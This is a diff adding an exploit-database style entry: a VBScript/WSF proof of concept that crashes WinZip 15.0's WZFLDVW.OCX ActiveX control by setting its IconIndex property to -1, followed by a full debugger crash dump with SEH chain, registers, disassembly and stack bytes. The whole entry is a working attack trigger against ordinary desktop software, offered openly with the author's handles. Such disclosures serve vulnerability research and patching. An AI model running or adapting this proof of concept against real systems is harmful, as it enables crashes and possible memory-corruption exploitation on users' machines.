@@ -1,0 +1,131 @@
+# Exploit Title: Winzip WZFLDVW.OCX IconIndex property access violation
+# Author: fady mohamed osman
+# Software Link : http://www.winzip.com/downwz.htm
+# Version:  15.0 (Build 9334)
+# Tested on: Win XP Sp2
+# CVE : N/A
+
+# Website : http://www.darkmasters.co.cc/
+# Twitter : http://twitter.com/Fady_Osman
+
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:4E3770F4-1937-4F05-B9A2-959BE7321909' id='target' />
+<script language='vbscript'>
+
+
+'Wscript.echo typename(target)
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\WinZip\WZFLDVW.OCX"
+prototype  = "Invoke_Unknown IconIndex As Long"
+memberName = "IconIndex"
+progid     = "FolderViewControl.TreeNode"
+argCount   = 1
+
+arg1=-1
+
+target.IconIndex = arg1
+
+</script></job></package>
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 1643C53	PUSH DWORD PTR [ESI+20]
+
+Seh Chain:
+--------------------------------------------------
+1 	180B82F 	wzfldvw.ocx
+2 	180B8F0 	wzfldvw.ocx
+3 	73351571 	VBSCRIPT.dll
+4 	73350F38 	VBSCRIPT.dll
+5 	73351DA5 	VBSCRIPT.dll
+6 	7335119D 	VBSCRIPT.dll
+7 	7C8399F3 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+wzfldvw.1643C53               wzfldvw.1631423               
+wzfldvw.1631423               wzfldvw.1666F8C               
+wzfldvw.1666F8C               wzfldvw.16434A0               
+wzfldvw.16434A0               VBSCRIPT.73313A78             
+VBSCRIPT.73313A78             VBSCRIPT.733139F6             
+VBSCRIPT.733139F6             VBSCRIPT.73304B01             
+VBSCRIPT.73304B01             VBSCRIPT.73306959             
+VBSCRIPT.73306959             VBSCRIPT.73301E55             
+VBSCRIPT.73301E55             VBSCRIPT.73303A76             
+VBSCRIPT.73303A76             VBSCRIPT.7330BE2A             
+VBSCRIPT.7330BE2A             VBSCRIPT.7330BEB9             
+VBSCRIPT.7330BEB9             SCROBJ.5CE4915E               
+SCROBJ.5CE4915E               SCROBJ.5CE4CF9C               
+SCROBJ.5CE4CF9C               SCROBJ.5CE4D0E2               
+SCROBJ.5CE4D0E2               SCROBJ.5CE4B106               
+SCROBJ.5CE4B106               SCROBJ.5CE4B49F               
+SCROBJ.5CE4B49F               100BB36                       
+100BB36                       1005EFE                       
+1005EFE                       1005215                       
+1005215                       100492B                       
+100492B                       1004A89                       
+1004A89                       1003C7B                       
+1003C7B                       KERNEL32.7C816D4F             
+
+
+Registers:
+--------------------------------------------------
+EIP 01643C53
+EAX BAADF00D
+EBX 00000000
+ECX BAADF00D
+EDX 01642B94 -> 18EBD88B
+EDI 00000008
+ESI BAADF00D
+EBP 0013EB1C -> 0013EB5C
+ESP 0013EAF0 -> 00AE75F0
+
+
+Block Disassembly: 
+--------------------------------------------------
+1643C48	MOV EDI,EDI
+1643C4A	PUSH EBP
+1643C4B	MOV EBP,ESP
+1643C4D	SUB ESP,28
+1643C50	PUSH ESI
+1643C51	MOV ESI,ECX
+1643C53	PUSH DWORD PTR [ESI+20]	  <--- CRASH
+1643C56	CALL [182C978]
+1643C5C	TEST EAX,EAX
+1643C5E	JNZ SHORT 01643C65
+1643C60	CALL 01635391
+1643C65	MOV EAX,[EBP+8]
+1643C68	TEST EAX,EAX
+1643C6A	JE SHORT 01643C60
+1643C6C	MOV [EBP-24],EAX
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	BAADF00D
+EBP+12	0013EB60 -> 01666F8C
+EBP+16	00000022
+EBP+20	BAADF00D
+EBP+24	FFFFFFFF
+EBP+28	0164299B -> 8B0020C2
+
+
+Stack Dump:
+--------------------------------------------------
+13EAF0 F0 75 AE 00 0E 28 64 01 80 EB 13 00 28 ED 13 00  [.u....d.........]
+13EB00 00 00 00 00 9B 29 64 01 DE 98 66 5E 08 00 00 00  [......d...f^....]
+13EB10 60 EB 13 00 00 00 00 00 BA 75 91 7C 5C EB 13 00  [`........u..\...]
+13EB20 23 14 63 01 0D F0 AD BA 60 EB 13 00 22 00 00 00  [..c.....`.......]
+13EB30 0D F0 AD BA FF FF FF FF 9B 29 64 01 57 2B 64 01  [..........d.W.d.]
+
+
+
+ApiLog
+--------------------------------------------------
+
+***** Installing Hooks *****
+7c826cab     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
+7c826cab     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
